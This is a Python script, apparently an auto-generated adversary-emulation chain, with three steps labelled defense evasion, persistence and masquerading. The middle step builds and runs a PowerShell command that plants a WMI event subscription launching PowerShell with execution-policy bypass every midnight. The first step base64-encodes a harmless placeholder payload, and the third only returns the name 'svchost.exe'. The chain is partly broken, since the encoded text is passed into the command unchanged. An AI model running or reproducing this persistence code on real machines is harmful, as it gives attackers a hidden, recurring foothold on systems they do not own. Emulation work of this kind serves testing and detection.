#!/usr/bin/env python3
import sys
import json
import time
from typing import Dict, Any
import base64
import subprocess

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Example PowerShell payload
        powershell_payload = "Write-Host 'Hello, World!'"

        # Obfuscate the PowerShell payload using base64 encoding
        obfuscated_payload = base64.b64encode(powershell_payload.encode()).decode()

        # Prepare the result
        result = {'script': obfuscated_payload}

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        # Return partial result with fallback value
        return {'success': False, 'data': {'script': None}, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        script = input_data.get('script', '')

        # Define the WMI command to create an event subscription
        subscription_name = "MyWMIEventSubscription"
        command = (
            f'PowerShell -Command "'
            f'$Filter = \'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \\"Win32_LocalTime\\" AND TargetInstance.Hour = 0 AND TargetInstance.Minute = 0\'; '
            f'$Consumer = New-Object Management.ManagementClass \\"\\root\\subscription:CommandLineEventConsumer\\"; '
            f'$Consumer.Name = \\"{subscription_name}\\"; '
            f'$Consumer.CommandLineTemplate = \\"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command {script}\\"; '
            f'$Consumer.Put(); '
            f'$Bind = ([wmiclass]\\"\\root\\subscription:__FilterToConsumerBinding\\").CreateInstance(); '
            f'$Bind.Filter = ([WMI]\'\\\\.\\root\\subscription:__EventFilter.Name=\\"{subscription_name}\\"\'); '
            f'$Bind.Consumer = $Consumer; '
            f'$Bind.Put();"'
        )

        # Execute the command to create the WMI event subscription
        subprocess.run(command, shell=True, check=True, timeout=10)

        result = {'subscription_id': subscription_name}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'subscription_id': None},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Extract the subscription_id from input_data
        subscription_id = input_data.get('subscription_id', '')

        # Define a legitimate Windows service name to masquerade as
        legitimate_service_name = "svchost.exe"

        # Prepare the result with the masqueraded process name
        result = {
            "process_name": legitimate_service_name
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        # Return partial result with fallback value on failure
        return {'success': False, 'data': {'process_name': None},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Obfuscate PowerShell Payload [defense-evasion] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Obfuscate PowerShell Payload): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Obfuscate PowerShell Payload): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Create WMI Event Subscription [persistence] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Create WMI Event Subscription): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Create WMI Event Subscription): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Masquerade as Legitimate Service [defense-evasion] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Masquerade as Legitimate Service): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Masquerade as Legitimate Service): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))